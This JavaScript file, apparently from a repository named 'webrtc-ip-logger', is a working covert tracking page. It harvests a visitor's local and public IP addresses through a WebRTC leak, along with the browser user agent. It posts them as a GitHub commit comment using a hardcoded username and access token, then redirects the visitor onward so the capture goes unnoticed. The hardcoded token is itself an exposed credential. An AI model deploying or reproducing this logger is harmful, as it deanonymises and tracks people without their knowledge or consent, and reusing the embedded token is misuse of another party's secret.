var userData = {
    "internalIPs": [],
    "externalIPs": {"ipv4": [], "ipv6": []},
    "userAgent": navigator.userAgent
};

getIPs(function(ip){
    //local IPs
    if (ip.match(/^(192\.168\.|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01]))/)) {
        userData.internalIPs.push(ip);
    }
    //IPv6 addresses
    else if (ip.match(/^[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7}$/)) {
        userData.externalIPs["ipv6"].push(ip);
    }
    //assume the rest are public IPs
    else {
        userData.externalIPs["ipv4"].push(ip);
    }
});

window.onload = function () {
    var gh = new GitHub({
        username: 'd3pl0y3r',
        token: 'e4bea94193611c011989b92f0f8234cecbbac1b9'
    });
    var repo = gh.getRepo('zettamax/webrtc-ip-logger');
    var sha = location.hash.slice(1);

    if (sha) {
        repo.getSingleCommit(sha).then(function (r) {
            var url = '/repos/zettamax/webrtc-ip-logger/commits/'
                + r.data.sha +'/comments';
            var data = {
                "body": '```' + JSON.stringify(userData, null, 2) + '\n```'
            };

            setTimeout(function () {
                repo._request('POST', url, data).then(function (r) {
                    location = r.data.commit.message;
                });
            }, 500);

        }).catch(function () {
            location = 'https://google.com';
        });
    } else {
        location = 'https://google.com';
    }
};